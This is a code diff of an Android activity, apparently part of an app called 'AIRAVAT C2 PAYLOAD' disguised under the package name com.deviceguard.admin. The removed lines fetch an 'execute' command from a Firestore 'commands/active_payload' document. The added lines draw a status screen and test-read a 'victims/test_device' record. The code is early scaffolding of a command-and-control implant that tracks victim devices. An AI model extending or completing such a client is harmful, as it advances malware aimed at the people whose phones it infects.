@@ -1,38 +1,54 @@
 package com.deviceguard.admin
 
 import android.os.Bundle
-import android.util.Log
+import android.widget.LinearLayout
+import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import com.google.firebase.firestore.FirebaseFirestore
-import com.google.firebase.firestore.DocumentSnapshot
-import com.google.firebase.firestore.QuerySnapshot
+import android.util.Log
 
 class MainActivity : AppCompatActivity() {
 
-    // Initialize Firestore
-    private lateinit var db: FirebaseFirestore
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // setContentView(R.layout.activity_main) // Uncomment if you have a UI layout
+        
+        // Create a safe UI programmatically to prevent crashes
+        val layout = LinearLayout(this)
+        layout.orientation = LinearLayout.VERTICAL
+        layout.setPadding(50, 50, 50, 50)
 
-        // Connect to the AIRAVAT C2 Backend
-        db = FirebaseFirestore.getInstance()
+        val title = TextView(this)
+        title.text = "AIRAVAT C2 PAYLOAD"
+        title.textSize = 24f
+        
+        val status = TextView(this)
+        status.text = "Status: Initializing..."
+        status.textSize = 16f
 
-        // Example of executing a Firestore query to get C2 commands
-        // This resolves the 'collection' and 'document' unresolved references
-        db.collection("commands")
-            .document("active_payload")
-            .get()
-            .addOnSuccessListener { document: DocumentSnapshot ->
-                if (document.exists()) {
-                    val command = document.getString("execute")
-                    Log.d("AIRAVAT_C2", "Command received: $command")
-                    // Add logic here to handle the C2 command
+        layout.addView(title)
+        layout.addView(status)
+        
+        // Set the layout as the screen
+        setContentView(layout)
+
+        // Try to connect to Firebase safely
+        try {
+            val db = FirebaseFirestore.getInstance()
+            
+            // Test connection by reading a document
+            db.collection("victims").document("test_device").get()
+                .addOnSuccessListener { document ->
+                    status.text = "Status: Connected to Firebase!"
+                    Log.d("AIRAVAT_C2", "Successfully connected to Firestore")
                 }
-            }
-            .addOnFailureListener { exception ->
-                Log.w("AIRAVAT_C2", "Error getting documents: ", exception)
-            }
+                .addOnFailureListener { exception ->
+                    status.text = "Status: Firebase Error\n${exception.message}"
+                    Log.e("AIRAVAT_C2", "Firebase error", exception)
+                }
+                
+        } catch (e: Exception) {
+            status.text = "Status: Firebase Init Failed\n${e.message}"
+            Log.e("AIRAVAT_C2", "Exception", e)
+        }
     }
 }
